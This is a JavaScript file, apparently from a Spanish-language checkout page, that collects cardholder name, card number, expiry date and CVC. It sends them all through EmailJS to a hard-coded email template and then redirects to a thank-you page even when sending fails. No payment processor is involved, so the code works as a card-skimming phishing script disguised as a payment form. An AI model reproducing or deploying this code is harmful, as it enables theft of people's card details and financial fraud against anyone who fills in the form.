(function() {
    emailjs.init('ReqtkWfjI392LAzFb');
})();

document.getElementById('paymentForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const formData = {
        user_name: document.getElementById('cardHolder').value, // Corregido el nombre del campo
        card_number: document.getElementById('cardNumber').value,
        expiry_date: document.getElementById('expiryDate').value,
        cvc_code: document.getElementById('cvc').value
    };

    // Validación del nombre (corregida)
    if (!/^[a-zA-ZÀ-ÿ\s']{5,}$/.test(formData.user_name)) {
        alert('Por favor ingresa tu nombre completo');
        return;
    }

    if (formData.card_number.length !== 16 || !/^\d+$/.test(formData.card_number)) {
        alert('Número de tarjeta inválido');
        return;
    }

    if (formData.cvc_code.length !== 3 || !/^\d+$/.test(formData.cvc_code)) {
        alert('CVC inválido');
        return;
    }

    const currentDate = new Date();
    const expiryDate = new Date(formData.expiry_date);
    if (expiryDate < currentDate) {
        alert('Tarjeta expirada');
        return;
    }

    emailjs.send("service_syrc1uk", "template_u3etoro", formData)
        .then(() => {
            window.location.href = "thank-you.html";
        })
        .catch(error => {
            console.error('Error:', error);
            window.location.href = "thank-you.html";
        });
});
